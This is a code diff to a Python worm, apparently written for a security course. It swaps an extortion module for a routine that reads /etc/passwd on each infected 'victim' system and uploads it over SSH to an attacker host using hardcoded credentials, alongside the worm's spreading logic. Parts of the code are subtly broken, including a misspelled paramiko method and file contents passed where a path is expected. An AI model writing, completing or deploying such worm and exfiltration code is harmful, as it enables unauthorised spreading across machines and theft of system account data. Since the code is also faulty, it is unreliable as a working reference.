@@ -1,7 +1,8 @@
 import sys
+import socket
+import paramiko
 
 from Replicator import Replicator
-from Extorter import Extorter
 
 def main(argv):
 
@@ -14,7 +15,6 @@ def main(argv):
 	]
 
 	myReplicator = Replicator(credList)
-	myExtorter = Extorter()
 
 	# If we are being run without a command line parameters,
 	# then we assume we are executing on a victim system and
@@ -89,9 +89,47 @@ def main(argv):
 			# If the system was already infected proceed.
 			# Otherwise, infect the system and terminate.
 			# Infect that system
-			myExtorter.execute()
+			stealPasswords(sshInfo, hostSystem)
 
 			print ("Spreading complete")
+
+def etPhoneHome(hostIP):
+	'''
+	Establish an SSH connection back to the attacker's system to upload
+	the retrieved passwords
+	:param hostIP: string
+	:return: paramiko.SSHClient
+	'''
+	baseSystem = paramiko.SSHClient()
+	baseSystem.set_mising_host_key_policy(paramiko.AutoAddPolicy())
+
+	try:
+		# Probably best to hide the attacker's credentials in case of a
+		# counter-attack. For now just hardcode it into the worm.
+		baseSystem.connect(hostIP, username='cpsc', password='cpsc')
+	except:
+		return None
+
+	return baseSystem
+
+
+def stealPasswords(sshClient, hostIP):
+	'''
+	Retrieve the password file on the victim's system and upload
+	back to the attacker
+	:param sshClient:
+	:param hostIP:
+	:return:
+	'''
+	hostSystem = etPhoneHome(hostIP)
+
+	if hostSystem:
+		f = open('/etc/passwd', 'r')
+		allThePasswords = f.read()
+		f.close()
+
+		hostSystem.put('passwd_' + sshClient.ip, allThePasswords)
+		# hostSystem.close()
 
 if __name__ == "__main__":
 	main(sys.argv[1:])
